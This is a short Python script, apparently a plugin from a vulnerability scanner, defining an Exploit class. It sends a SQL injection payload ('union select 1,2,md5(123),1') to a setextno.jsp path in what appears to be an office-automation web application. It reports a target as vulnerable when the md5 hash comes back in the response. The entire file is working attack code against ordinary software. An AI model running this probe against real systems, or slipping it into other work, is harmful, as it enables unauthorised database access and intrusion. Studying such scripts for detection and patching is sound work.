# coding:utf-8
import requests

class Exploit:

    def attack(self, url):
        path = '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20select%201,2,md5(123),1%23'
        target = url+path

        response = requests.get(target)
        if response.status_code == 200 and '202cb962ac59075b964b07152d234b70' in response.content:
            return url